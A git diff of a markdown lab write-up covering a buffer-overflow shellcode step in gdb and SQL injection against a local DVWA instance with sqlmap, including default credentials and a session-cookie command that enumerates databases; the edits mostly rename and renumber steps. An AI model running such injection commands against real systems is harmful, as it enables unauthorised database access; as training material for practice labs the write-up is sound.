@@ -99,7 +99,7 @@ _start:
   ```
   #### step 5: Find the address of the shellcode
   ```bash
-     gdb ./vulnerable
+     gdb ./redundant_code
   ```
   - in `gdb` set a breakpoint at `main ` run the program with a dummy argument to obtain the address of your shellcode.
   ```bash
@@ -126,18 +126,20 @@ _start:
    ![image](https://github.com/user-attachments/assets/c89ed07c-5616-4614-8b55-8f4a27d30e8a)
 2. Access DVWA with a web browser and go to: http://localhost Log in with the default user
    ![image](https://github.com/user-attachments/assets/c4c3bba3-24e9-4a2b-a9c3-660a20aeed61)
-   User: admin
+
+    User: admin
    Password: password
-   ![2](https://github.com/user-attachments/assets/d606eac2-2999-4370-b19c-b959cda33fff)
-3. Install SQLMap in WSL
+
+    ![2](https://github.com/user-attachments/assets/d606eac2-2999-4370-b19c-b959cda33fff)
+4. Install SQLMap in WSL
    ```bash
       wsl
       sudo apt install sqlmap
    ```
-4. Find the website url to attack
+5. Find the website url to attack
    ![image](https://github.com/user-attachments/assets/aaad26f0-4f4e-49f8-8910-bc69b19387f2)
    enter random to return http://localhost/vulnerabilities/sqli/?id=1
-5. Get information from the database
+6. Get information from the database
    ```bash
       sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --dbs
    ```
